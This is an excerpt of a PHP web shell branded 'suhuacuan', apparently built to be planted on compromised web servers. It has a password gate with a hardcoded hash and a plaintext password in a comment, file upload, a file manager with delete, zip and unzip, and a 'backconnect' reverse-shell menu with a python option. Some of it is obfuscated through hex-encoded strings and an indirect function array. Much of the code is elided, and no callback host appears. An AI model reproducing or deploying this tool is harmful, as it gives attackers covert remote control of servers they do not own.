...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '61e5a4af097c4794158a7d771bdee948'; #pass
    //$stored_hashed_password = 'BandotKeren'; #pass
...
<head>
    ...
    <title>suhuacuan [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            <li class="logo-suhuacuan"><img width="150" height="150" src="https://ik.imagekit.io/yizbmznmy/hanfei.jpg?updatedAt=1756267806318" align="right"></li>
    ...
    <div class="menu-tools" style="background:#CC8E1C;border-top: 1px solid #fff;border-bottom: 1px solid #fff;">
        <ul>
    ...
    <form style="margin:10px 0;" action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
        <span class="form-upload"><input type="file" name="suhuacuan-upload" class="form-file">&nbsp;<input type="submit" value="Upload" name="suhuacuan-up-submit" class="btn-submit"></span>
    </form>
    <hr>
    <?php
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="suhuacuan-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="suhuacuan-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-gecko box-shadow" name="suhuacuan-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['suhuacuan-bc'] == "python") {
...
if (isset($_POST['suhuacuan-up-submit'])) {
    $namaFilenya = $_FILES['suhuacuan-upload']['name'];
    $tmpName = $_FILES['suhuacuan-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['suhuacuan-select'] == "delete") {
        foreach ($items as $it) {
    ...
    } else if ($_POST['suhuacuan-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['suhuacuan-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
